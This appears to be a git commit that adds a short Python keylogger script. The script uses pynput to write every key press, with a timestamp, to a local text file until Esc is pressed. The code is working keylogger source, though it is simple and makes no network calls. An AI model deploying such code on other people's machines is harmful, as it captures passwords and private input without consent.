255b9fa1b7a85e80a979b4aaf82783b7c1e9330a
YoungYuan1971 <young_yuan@hotmail.com>
2021-06-01 17:25:30 +0800

    Key Logger

---
+++ Key_Logger.py
@@ -0,0 +1,22 @@
+from pynput.keyboard import Key, Listener
+import datetime
+
+
+def on_press(key):
+    date = datetime.datetime.now()
+    date = f'{date.year}-{date.month}-{date.day} {date.hour}:{date.minute}:{date.second}'
+
+    msg = f'{date}--> {key} 被按下\n'
+
+    f.write(msg)
+
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+
+if __name__ == '__main__':
+    with open('key_log.txt', 'w', encoding='utf-8') as f:
+        with Listener(on_press=on_press, on_release=on_release) as listener:
+            listener.join()
